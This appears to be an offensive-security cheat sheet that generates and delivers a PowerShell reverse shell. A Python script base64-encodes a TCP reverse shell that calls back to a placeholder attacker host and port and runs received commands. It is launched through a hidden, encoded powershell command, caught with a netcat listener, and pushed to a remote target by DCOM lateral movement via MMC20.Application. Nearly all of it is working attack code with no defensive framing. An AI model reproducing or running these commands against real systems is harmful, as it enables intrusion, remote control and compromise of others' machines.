# Powershell command generation
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("$(LHOST)",$(LPORT));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
```bash
nc -lvnp $(LPORT)
```
On the target:
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$(TARGET_IP)"))
```
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"$(OUTPUT_FROM_PYTHON_SCRIPT)","7")
```
